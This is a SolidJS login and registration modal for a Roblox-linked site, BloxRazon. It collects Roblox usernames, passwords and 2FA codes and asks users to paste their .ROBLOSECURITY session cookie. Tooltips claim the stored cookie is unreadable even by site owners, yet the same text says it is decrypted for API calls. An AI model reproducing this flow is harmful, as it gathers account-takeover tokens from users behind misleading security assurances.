import {createSignal, onCleanup, createEffect} from "solid-js";
import {A, useSearchParams} from "@solidjs/router";
import {api, authedAPI, createNotification, fetchUser, getJWT} from "../../util/api";
import {useUser} from "../../contexts/usercontextprovider";
import Toggle from "../Toggle/toggle";
import RobloxMFA from "../MFA/robloxmfa";

function SignIn(props) {

    const [searchParams, setSearchParams] = useSearchParams()
    const [agree, setAgree] = createSignal(false)
    const [mode, setMode] = createSignal(0) // 0: credentials, 1: cookie
    const [authMode, setAuthMode] = createSignal('signin') // 'signin' or 'signup'

    const [security, setSecurity] = createSignal('')
    const [username, setUsername] = createSignal('')
    const [password, setPassword] = createSignal('')
    const [confirmPassword, setConfirmPassword] = createSignal('')

    const [user, { mutateUser }] = useUser()

    const [isLoggingIn, setIsLoggingIn] = createSignal(false)
    const [twoFactorOpen, setTwoFactorOpen] = createSignal(false)
    const [captchaOpen, setCaptchaOpen] = createSignal(false)
    const [banInfo, setBanInfo] = createSignal(null)
    const [registrationStep, setRegistrationStep] = createSignal(1) // 1: credentials, 2: cookie entry, 3: verify identity
    const [robloxVerifiedData, setRobloxVerifiedData] = createSignal(null) // stores {id, username, avatarUrl, robux}

    const [loginId, setLoginId] = createSignal(null)
    const [blob, setBlob] = createSignal(null)

    // Set auth mode based on signup parameter
    createEffect(() => {
        setAuthMode(searchParams.signup === 'true' ? 'signup' : 'signin')
    })

    window.addEventListener('message', handleIFrameMessage)

    async function handleIFrameMessage(event) {
        let data = event.data
        if (!data || data.type !== 'captcha') return

        let loginRes = await api('/auth/login/captcha', 'POST', JSON.stringify({
            loginId: loginId(),
            captchaToken: data.token
        }), true)
        handleLoginData(loginRes)

        setCaptchaOpen(false)
    }

    async function handleLoginData(data, stayOpenOnFail) {
        console.log('handleLoginData received:', data);
        if (!data || data.error) { 
            // Check if user is banned
            if (data && data.banned) {
                console.log('Setting ban info:', data);
                setIsLoggingIn(false);
                setBanInfo(data);
                return false;
            }
        }

        if (data.phase && data.phase === 'CAPTCHA') {
            setLoginId(data.loginId)
            setBlob(data.captcha.dxBlob)
            setCaptchaOpen(true)
            setTwoFactorOpen(false)
            setIsLoggingIn(true)
            return false
        }

        if (data.phase && data.phase === '2FA') {
            setIsLoggingIn(true)
            setTwoFactorOpen(true)
            setCaptchaOpen(false)
            return false
        }

        if (data.token) {

            const d = new Date(Date.now() + data.expiresIn * 1000);
            document.cookie = `jwt=${data.token}; expires=${d.toUTCString()};`

            if (props?.ws() && props?.ws()?.connected) {
                props?.ws().emit('auth', getJWT())
            }

            let user = await fetchUser()
            mutateUser(user)

            // AFFILIATES
            let code = localStorage.getItem('aff')
            if (code) {
                let res = await authedAPI('/user/affiliate', 'POST', JSON.stringify({
                    code: code
                }), true)

                if (res.success) {
                    createNotification('success', `Successfully redeemed affiliate code ${code}.`)
                }
                localStorage.removeItem('aff')
            }

            close(false)
        }

        cancelLogin()
        return true
    }

    function cancelLogin(stayOpenOnFail) {
        if (stayOpenOnFail) return

        setCaptchaOpen(false)
        setTwoFactorOpen(false)
        setIsLoggingIn(false)
        setLoginId(null)
        setBlob(null)
    }

    function close() {
        setSearchParams({ modal: null, signup: null })
    }

    onCleanup(() => window.removeEventListener('message', handleIFrameMessage))

    return (
        <>
            <div class='modal' onClick={() => close()}>
                <div class='signin-container' onClick={(e) => e.stopPropagation()}>
                    <p class='close bevel' onClick={() => close()}>X</p>

                    {banInfo() ? (
                        <div class='content'>
                            <div style={{ 'text-align': 'center', 'padding': '40px 20px' }}>
                                <svg width="80" height="80" viewBox="0 0 24 24" fill="none" style={{ margin: '0 auto 20px', display: 'block' }}>
                                    <circle cx="12" cy="12" r="10" stroke="#ef4444" stroke-width="2"/>
                                    <path d="M15 9L9 15M9 9L15 15" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
                                </svg>
                                
                                <h1 style={{ color: '#ef4444', 'margin-bottom': '20px' }}>ACCOUNT BANNED</h1>
                                
                                <div class='bar' style={{ 'margin-bottom': '30px' }}/>
                                
                                <div style={{ 
                                    background: 'rgba(239, 68, 68, 0.1)', 
                                    border: '1px solid rgba(239, 68, 68, 0.3)',
                                    'border-radius': '8px',
                                    padding: '20px',
                                    'margin-bottom': '30px'
                                }}>
                                    <p style={{ 'font-size': '16px', 'line-height': '1.6', color: '#fff', 'margin-bottom': '15px' }}>
                                        {banInfo().message}
                                    </p>
                                    
                                    {banInfo().tempBan && banInfo().expiresAt && (
                                        <p style={{ 'font-size': '14px', color: '#9ca3af' }}>
                                            Your ban will expire on: <br/>
                                            <span style={{ color: '#fbbf24', 'font-weight': 'bold' }}>
                                                {new Date(banInfo().expiresAt).toLocaleString()}
                                            </span>
                                        </p>
                                    )}
                                    
                                    {!banInfo().tempBan && (
                                        <p style={{ 'font-size': '14px', color: '#9ca3af' }}>
                                            This is a permanent ban. Contact support if you believe this is a mistake.
                                        </p>
                                    )}
                                </div>
                                
                                <button 
                                    class='bevel'
                                    style={{ width: '100%', padding: '15px', 'font-size': '16px', 'margin-top': '10px' }}
                                    onClick={() => {
                                        setBanInfo(null);
                                        close();
                                        window.location.href = '/';
                                    }}
                                >
                                    RETURN TO HOME
                                </button>
                            </div>
                        </div>
                    ) : (
                    <div class='content'>
                        <h2>{authMode() === 'signin' ? 'SIGN IN' : (registrationStep() === 1 ? 'SIGN UP - STEP 1/3' : registrationStep() === 2 ? 'SIGN UP - STEP 2/3' : 'SIGN UP - STEP 3/3')}</h2>
                        <h1>WELCOME TO <span class='gold'>BLOXRAZON</span></h1>

                        <div class='bar'/>

                        {/* SIGN IN MODE */}
                        {authMode() === 'signin' && (
                            <>
                                {/* Login Method Toggle */}
                                <div class='options'>
                                    <button 
                                        class={'option ' + (mode() === 0 ? 'active' : '')} 
                                        onClick={() => setMode(0)}
                                    >
                                        CREDENTIALS
                                    </button>
                                    <button 
                                        class={'option ' + (mode() === 1 ? 'active' : '')} 
                                        onClick={() => setMode(1)}
                                    >
                                        COOKIE
                                    </button>
                                </div>

                                {/* Credentials Mode - Username + Password */}
                                {mode() === 0 && (
                                    <>
                                        <p class='label'>USERNAME</p>
                                        <input type='text' placeholder='Enter your username' class='credentials' value={username()} onChange={(e) => setUsername(e.target.value.replace(/\s/g, ''))} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.signin').click()}/>

                                        <p class='label'>PASSWORD</p>
                                        <input type='password' placeholder='Enter your password' class='credentials' value={password()} onChange={(e) => setPassword(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.signin').click()}/>
                                    </>
                                )}

                                {/* Cookie Mode - Cookie Only */}
                                {mode() === 1 && (
                                    <>
                                <div style={{ display: 'flex', 'align-items': 'center', gap: '8px', 'margin-top': '10px', 'margin-bottom': '20px' }}>
                                    <p class='label cookie-label-signin' style={{ margin: 0 }}>FILL IN YOUR .ROBLOSECURITY COOKIE</p>
                                    <div class='info-icon-wrapper' style={{ position: 'relative', display: 'inline-block' }}>
                                        <svg width='16' height='16' viewBox='0 0 16 16' fill='none' style={{ cursor: 'help', 'vertical-align': 'middle' }}>
                                            <circle cx='8' cy='8' r='7' stroke='#FFD700' stroke-width='1.5' fill='none'/>
                                            <text x='8' y='11.5' text-anchor='middle' fill='#FFD700' font-size='10' font-weight='bold'>i</text>
                                        </svg>
                                        <div class='cookie-tooltip'>
                                            🔒 <strong>Your cookie is secure!</strong><br/>
                                            We encrypt all Roblox cookies using AES-256 encryption before storing them in our database.<br/><br/>
                                            This means <strong>NO ONE</strong> - not even site owners - can read your cookie in plain text.<br/><br/>
                                            Your cookie is only decrypted temporarily when making authorized API calls on your behalf.
                                        </div>
                                    </div>
                                </div>
                                <input type='text' placeholder='_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you...' class='credentials' value={security()} onInput={(e) => setSecurity(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.signin').click()}/>
                                    </>
                                )}

                                <button class='bevel-red signin' onClick={async () => {
                                    if (isLoggingIn()) return

                                    let data
                                    setIsLoggingIn(true)

                                    if (mode() === 0) {
                                        // Credentials mode - username and password only
                                        if (!username() || !password()) {
                                            setIsLoggingIn(false)
                                            return createNotification('error', 'Please enter username and password')
                                        }

                                        data = await api('/auth/login', 'POST', JSON.stringify({
                                            username: username(),
                                            password: password()
                                        }), true)
                                    } else {
                                        // Cookie mode - cookie only
                                        if (!security()) {
                                            setIsLoggingIn(false)
                                            return createNotification('error', 'Please enter your Roblox cookie')
                                        }

                                        data = await api('/auth/login/cookie', 'POST', JSON.stringify({
                                            cookie: security(),
                                        }), true)
                                    }

                                    handleLoginData(data)
                                }}>SIGN IN</button>
                            </>
                        )}

                        {/* SIGN UP MODE - STEP 1: CREDENTIALS */}
                        {authMode() === 'signup' && registrationStep() === 1 && (
                            <>
                                <p class='label'>USERNAME</p>
                                <input type='text' placeholder='Enter your username' class='credentials' value={username()} onChange={(e) => setUsername(e.target.value.replace(/\s/g, ''))} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.next-step').click()}/>

                                <p class='label'>PASSWORD</p>
                                <input type='password' placeholder='Enter your password' class='credentials' value={password()} onChange={(e) => setPassword(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.next-step').click()}/>
                                
                                <p class='label'>CONFIRM PASSWORD</p>
                                <input type='password' placeholder='Confirm your password' class='credentials' value={confirmPassword()} onChange={(e) => setConfirmPassword(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.next-step').click()}/>

                                <div class='tos'>
                                    <Toggle active={agree()} toggle={() => setAgree(!agree())}/>
                                    <p>By checking this box you agree to our <A href='/docs/tos' class='white bold strip'>Terms & Conditions</A></p>
                                </div>

                                <button class='bevel-gold next-step' onClick={() => {
                                    if (!agree()) return createNotification('error', 'You must accept our Terms and Conditions and Privacy Policy')
                                    if (!username() || !password() || !confirmPassword()) {
                                        return createNotification('error', 'Please fill in all fields')
                                    }
                                    if (password() !== confirmPassword()) {
                                        return createNotification('error', 'Passwords do not match')
                                    }
                                    setRegistrationStep(2)
                                }}>NEXT: CONNECT ROBLOX</button>
                            </>
                        )}

                        {/* SIGN UP MODE - STEP 2: ROBLOX COOKIE ENTRY */}
                        {authMode() === 'signup' && registrationStep() === 2 && (
                            <>
                                <div style={{ display: 'flex', 'align-items': 'center', gap: '8px', 'margin-top': '20px', 'margin-bottom': '10px' }}>
                                    <p class='label' style={{ margin: 0 }}>ENTER YOUR .ROBLOSECURITY COOKIE</p>
                                    <div class='info-icon-wrapper' style={{ position: 'relative', display: 'inline-block' }}>
                                        <svg width='16' height='16' viewBox='0 0 16 16' fill='none' style={{ cursor: 'help', 'vertical-align': 'middle' }}>
                                            <circle cx='8' cy='8' r='7' stroke='#FFD700' stroke-width='1.5' fill='none'/>
                                            <text x='8' y='11.5' text-anchor='middle' fill='#FFD700' font-size='10' font-weight='bold'>i</text>
                                        </svg>
                                        <div class='cookie-tooltip'>
                                            🔒 <strong>Your cookie is secure!</strong><br/>
                                            We encrypt all Roblox cookies using AES-256 encryption before storing them in our database.<br/><br/>
                                            This means <strong>NO ONE</strong> - not even site owners - can read your cookie in plain text.<br/><br/>
                                            Your cookie is only decrypted temporarily when making authorized API calls on your behalf.
                                        </div>
                                    </div>
                                </div>
                                <input type='text' placeholder='_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you...' class='credentials' value={security()} onInput={(e) => setSecurity(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && document.querySelector('.verify-cookie').click()} style={{ 'margin-bottom': '20px' }}/>
                                
                                <button class='bevel-gold verify-cookie' onClick={async () => {
                                    if (isLoggingIn()) return
                                    if (!security()) return createNotification('error', 'Please enter your Roblox cookie')
                                    
                                    setIsLoggingIn(true)
                                    
                                    const data = await api('/auth/verify-roblox-cookie', 'POST', JSON.stringify({
                                        cookie: security()
                                    }), true)
                                    
                                    setIsLoggingIn(false)
                                    
                                    if (data && data.valid) {
                                        setRobloxVerifiedData({
                                            id: data.robloxId,
                                            username: data.robloxUsername,
                                            avatarUrl: data.avatarUrl,
                                            robux: data.robux
                                        })
                                        setRegistrationStep(3)
                                        createNotification('success', 'Roblox account verified!')
                                    } else if (data && data.error) {
                                        createNotification('error', data.error)
                                    }
                                }}>VERIFY COOKIE</button>

                                <button class='bevel' onClick={() => {
                                    setRegistrationStep(1)
                                    setSecurity('')
                                }}>BACK</button>
                            </>
                        )}

                        {/* SIGN UP MODE - STEP 3: VERIFY IDENTITY */}
                        {authMode() === 'signup' && registrationStep() === 3 && robloxVerifiedData() && (
                            <>
                                <div style={{ 
                                    display: 'flex', 
                                    'flex-direction': 'column', 
                                    'align-items': 'center', 
                                    gap: '20px',
                                    padding: '20px',
                                    background: 'rgba(0,0,0,0.3)',
                                    'border-radius': '8px',
                                    margin: '20px 0'
                                }}>
                                    <img 
                                        src={robloxVerifiedData().avatarUrl} 
                                        alt='Roblox Avatar' 
                                        style={{ 
                                            width: '150px', 
                                            height: '150px', 
                                            'border-radius': '50%',
                                            border: '3px solid #FFD700'
                                        }}
                                    />
                                    <div style={{ 'text-align': 'center' }}>
                                        <h3 style={{ color: '#FFD700', margin: '10px 0' }}>{robloxVerifiedData().username}</h3>
                                        <p style={{ color: '#fff', 'font-size': '14px' }}>Roblox ID: {robloxVerifiedData().id}</p>
                                        <p style={{ color: '#9ca3af', 'font-size': '14px', 'margin-top': '5px' }}>Robux: {robloxVerifiedData().robux?.toLocaleString() || 0}</p>
                                    </div>
                                </div>

                                <h3 style={{ 'text-align': 'center', color: '#fff', margin: '20px 0' }}>Is this you?</h3>

                                <button class='bevel-gold' onClick={async () => {
                                    if (isLoggingIn()) return
                                    setIsLoggingIn(true)
                                    
                                    const data = await api('/auth/register', 'POST', JSON.stringify({
                                        username: username(),
                                        password: password(),
                                        robloxCookie: security()
                                    }), true)
                                    
                                    if (data && data.success) {
                                        createNotification('success', 'Account created successfully! Welcome to BloxRazon!')
                                        handleLoginData(data)
                                    } else {
                                        setIsLoggingIn(false)
                                        if (data && data.error) {
                                            createNotification('error', data.error)
                                        }
                                    }
                                }}>YES, CREATE MY ACCOUNT</button>

                                <button class='bevel' onClick={() => {
                                    setRegistrationStep(2)
                                    setSecurity('')
                                    setRobloxVerifiedData(null)
                                }}>WRONG ACCOUNT</button>
                            </>
                        )}

                        {authMode() === 'signin' && (
                            <div class='auth-toggle'>
                                <p>
                                    Don't have an account? {' '}
                                    <span class='toggle-link' onClick={() => {
                                        setAuthMode('signup')
                                        setUsername('')
                                        setPassword('')
                                        setConfirmPassword('')
                                        setSecurity('')
                                        setRegistrationStep(1)
                                        setRobloxVerifiedData(null)
                                        setAgree(false)
                                    }}>
                                        Sign Up
                                    </span>
                                </p>
                            </div>
                        )}

                        {authMode() === 'signup' && (
                            <div class='auth-toggle-signup'>
                                <p>
                                    Already have an account? {' '}
                                    <span class='toggle-link' onClick={() => {
                                        setAuthMode('signin')
                                        setUsername('')
                                        setPassword('')
                                        setConfirmPassword('')
                                        setSecurity('')
                                        setRegistrationStep(1)
                                        setRobloxVerifiedData(null)
                                        setAgree(false)
                                    }}>
                                        Sign In
                                    </span>
                                </p>
                            </div>
                        )}

                        <div class='disclaimer'>
                            {authMode() === 'signin' ? (
                                <>
                                    {mode() === 0 ? (
                                        <>
                                            Sign in with your <span class='gold bold'>BloxRazon</span> username and password.
                                            <br/><br/>
                                            If you prefer to sign in with your Roblox cookie instead, switch to the Cookie mode.
                                        </>
                                    ) : (
                                        <>
                                            Sign in directly with your Roblox account cookie.
                                            <br/><br/>
                                            Your cookie is <span class='bold'>AES-256 encrypted</span> in our database - not even site owners can read it! It's only decrypted temporarily for authorized API calls on your behalf.
                                        </>
                                    )}
                                </>
                            ) : (
                                registrationStep() === 1 ? (
                                    <>Join <span class='gold bold'>BloxRazon</span> today! In the next step, you'll connect your Roblox account to start playing.</>
                                ) : registrationStep() === 2 ? (
                                    <>
                                        We need to verify your Roblox account. Your <span class='gold bold'>.ROBLOSECURITY</span> cookie helps us confirm your identity and sync your account info.
                                        <br/><br/>
                                        Your cookie is <span class='bold'>AES-256 encrypted</span> before storage - completely secure!
                                    </>
                                ) : (
                                    <>
                                        Confirm this is your Roblox account. Once confirmed, your account will be created and linked to your Roblox profile!
                                    </>
                                )
                            )}
                        </div>
                    </div>
                    )}

                    <div class='art'>
                        <img src='/assets/art/modal_art.png' alt='' draggable={false}/>
                    </div>
                    
                    <div class='confirm-wrapper'>
                        <p class='confirm'>
                            By accessing <span class='bold white'>BloxRazon</span>, I attest that I am at least 18 years old and have read the <A href='/docs/tos' class='white bold strip'>Terms & Conditions.</A>
                        </p>
                    </div>
                </div>
            </div>

            {twoFactorOpen() && (
                <RobloxMFA close={cancelLogin} complete={async (code) => {
                    let loginRes = await api('/auth/login/2fa', 'POST', JSON.stringify({
                        loginId: loginId(),
                        code
                    }), true)
                    let response = handleLoginData(loginRes, true)
                }}/>
            )}

            {captchaOpen() && (
                <div class='modal' onClick={cancelLogin}>
                    <div class='captcha-container' onClick={(e) => e.stopPropagation()}>
                        <p>Solve the Captcha</p>
                        <iframe src={`${import.meta.env.VITE_SERVER_URL}/auth/iframe?blob=${encodeURIComponent(blob())}`} width='310px' height='295px'/>
                        <div id='captcha-div'/>
                    </div>
                </div>
            )}

            <style jsx>{`
                .modal {
                  position: fixed;
                  top: 0;
                  left: 0;
                  
                  width: 100vw;
                  height: 100vh;

                  background: rgba(24, 23, 47, 0.55);
                  cubic-bezier(0,1,0,1);
                  
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  
                  z-index: 1000;
                }
                
                .signin-container {
                  max-width: 930px;
                  max-height: 630px;
                  
                  height: 100%;
                  width: 100%;

                  background: #1d2125;
                  box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
                  border-radius: 15px;
                  
                  display: flex;
                  transition: max-height .3s;
                  position: relative;

                  overflow: hidden;
                }

                .captcha-container {
                  max-width: 450px;
                  color: white;

                  width: 100%;

                  background: #1d2125;
                  box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
                  border-radius: 15px;

                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  font-weight: 700;
                  padding: 25px 0;
                  gap: 25px;
                  
                  transition: max-height .3s;
                  position: relative;

                  overflow: hidden;
                }
                
                .close {
                  position: absolute;
                  top: 15px;
                  left: 15px;

                  width: 26px;
                  height: 26px;
                  
                  background: #2a2d31;
                  box-shadow: 0px -1px 0px #3a3d41, 0px 1px 0px #1a1d21;
                  border-radius: 3px;
                  
                  display: flex;
                  align-items: center;
                  justify-content: center;

                  font-weight: 700;
                  color: #ef4444;
                  cursor: pointer;
                }
                
                h1 {
                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 32px;
                  color: #FFFFFF;
                }
                
                .gold {
                  background: linear-gradient(53.13deg, #FF9900 54.58%, #F9AC39 69.11%);
                  -webkit-background-clip: text;
                  -webkit-text-fill-color: transparent;
                  background-clip: text;
                  text-fill-color: transparent;
                }
                
                .content {
                  width: 100%;
                  
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  
                  padding: 25px 0 0 0;
                }
                
                h2 {
                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 22px;
                  color: #ADA3EF;
                }
                
                .bar {
                  width: 386px;
                  height: 1px;
                  
                  margin: 10px 0 20px 0;
                  
                  background: linear-gradient(53.13deg, #FF9900 54.58%, #F9AC39 69.11%), linear-gradient(90deg, #7435FA 0%, #435DE8 163.22%);
                  transform: matrix(1, 0, 0, -1, 0, 0);
                }
                
                .options {
                  width: 386px;
                  display: flex;
                  gap: 12px;
                  margin-bottom: 5px;
                }
                
                .option {
                  flex: 1;
                  height: 34px;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 14px;
                  text-align: center;

                  display: flex;
                  align-items: center;
                  justify-content: center;
                  
                  color: #9ca3af;
                  background: transparent;
                  cursor: pointer;

                  outline: unset;
                  border: unset;
                }
                
                .option.active {
                  background: conic-gradient(from 180deg at 50% 50%, #FFDC18 -0.3deg, #B17818 72.1deg, rgba(156, 99, 15, 0.611382) 139.9deg, rgba(126, 80, 12, 0.492874) 180.52deg, rgba(102, 65, 10, 0.61) 215.31deg, #B17818 288.37deg, #FFDC18 359.62deg, #FFDC18 359.7deg, #B17818 432.1deg);
                  border-radius: 3px;
                  
                  position: relative;

                  color: #FCA31E;
                  overflow: hidden;
                  z-index: 0;
                }
                
                .option.active:before {
                  position: absolute;
                  content: '';
                  
                  width: calc(100% - 2px);
                  height: calc(100% - 2px);
                  
                  top: 1px;
                  left: 1px;
                  
                  background: linear-gradient(0deg, rgba(255, 190, 24, 0.25), rgba(255, 190, 24, 0.25)), linear-gradient(252.77deg, #1A0E33 -27.53%, #423C7A 175.86%);
                  z-index: -1;
                }
                
                .label {
                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 14px;
                  text-align: center;
                  color: #ADA3EF;
                  
                  margin: 20px 0 10px 0;
                }

                .label.cookie-label-signin {
                  margin-bottom: 20px;
                }
                
                .credentials {
                  width: 386px;
                  height: 50px;

                  outline: unset;
                  border: unset;
                  
                  background: #2a2d31;
                  border: 1px solid #3a3d41;
                  border-radius: 3px;
                  
                  padding: 0 12px;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 13px;
                  color: #9ca3af;
                }
                
                .tos {
                  margin: 20px 0 0px 0;
                  display: flex;
                  gap: 8px;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 400;
                  font-size: 13px;
                  color: #ADA3EF;
                }
                
                .signin {
                  width: 180px;
                  height: 42px;
                  
                  margin: 35px 0;
                  
                  outline: unset;
                  border: unset;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 14px;
                  color: #1a1d21;
                  text-align: center;
                  
                  cursor: pointer;
                  
                  display: flex;
                  align-items: center;
                  justify-content: center;
                }
                
                .next-step, .verify-cookie {
                  width: 240px;
                  height: 42px;
                  
                  margin: 20px 0 10px 0;
                  
                  outline: unset;
                  border: unset;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 14px;
                  color: #1a1d21;
                  text-align: center;
                  
                  cursor: pointer;
                  
                  display: flex;
                  align-items: center;
                  justify-content: center;
                }

                button.bevel {
                  width: 180px;
                  height: 42px;
                  
                  margin: 10px 0;
                  
                  outline: unset;
                  border: unset;

                  font-family: 'Geogrotesque Wide';
                  font-weight: 700;
                  font-size: 14px;
                  color: #FFFFFF;
                  text-align: center;
                  
                  cursor: pointer;
                  
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  background: #2a2d31;
                }

                .auth-toggle {
                  margin: -20px 0 10px 0;
                  
                  font-family: 'Geogrotesque Wide';
                  font-weight: 400;
                  font-size: 13px;
                  text-align: center;
                  color: #ADA3EF;
                }

                .auth-toggle-signup {
                  margin: 10px 0;
                  
                  font-family: 'Geogrotesque Wide';
                  font-weight: 400;
                  font-size: 13px;
                  text-align: center;
                  color: #ADA3EF;
                }
                
                .toggle-link {
                  color: #FCA31E;
                  font-weight: 700;
                  cursor: pointer;
                  text-decoration: underline;
                }
                
                .toggle-link:hover {
                  color: #FFBE18;
                }
                
                .disclaimer {
                  font-family: 'Geogrotesque Wide';
                  font-weight: 400;
                  font-size: 13px;
                  text-align: center;
                  
                  margin-top: auto;
                  padding: 15px 20px;
                  color: #9ca3af;
                  width: 100%;
                  
                  background: rgba(0, 0, 0, 0.3);
                  border-radius: 0px 0px 0px 15px;
                }
                
                .art {
                  width: 100%;
                  max-width: 368px;
                  height: 100%;
                  background: transparent;
                  display: flex;
                  position: relative;
                }
                
                .art > img {
                  width: 100%;
                  height: 100%;
                  object-fit: cover;
                  object-position: center;
                  border-radius: 0 15px 15px 0;
                }
                
                .confirm-wrapper {
                  position: absolute;
                  bottom: 0;
                  right: 0;
                  width: 100%;
                  max-width: 368px;
                  z-index: 2;
                }

                .confirm {
                  font-family: 'Geogrotesque Wide';
                  font-weight: 400;
                  font-size: 14px;
                  color: #ADA3EF;
                  
                  text-align: center;
                  background: transparent;
                  border-radius: 0;
                  
                  padding: 12px;
                  margin: 0;
                  width: 100%;
                }
                
                h1, h2 {
                  margin: unset;
                }
                
                iframe {
                  display: block;
                  margin: unset;
                  padding: unset;
                  border: none;
                }

                .cookie-tooltip {
                  visibility: hidden;
                  opacity: 0;
                  position: fixed;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  background-color: rgba(30, 30, 40, 0.98);
                  color: #fff;
                  text-align: left;
                  border-radius: 8px;
                  padding: 15px;
                  width: 320px;
                  z-index: 10001;
                  font-size: 13px;
                  line-height: 1.6;
                  border: 2px solid #FFD700;
                  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
                  transition: opacity 0.3s, visibility 0.3s;
                  pointer-events: none;
                }

                .info-icon-wrapper:hover .cookie-tooltip {
                  visibility: visible;
                  opacity: 1;
                }

                .info-icon-wrapper svg {
                  transition: transform 0.2s;
                }

                .info-icon-wrapper:hover svg {
                  transform: scale(1.1);
                }
            `}</style>
        </>
    )
}

export default SignIn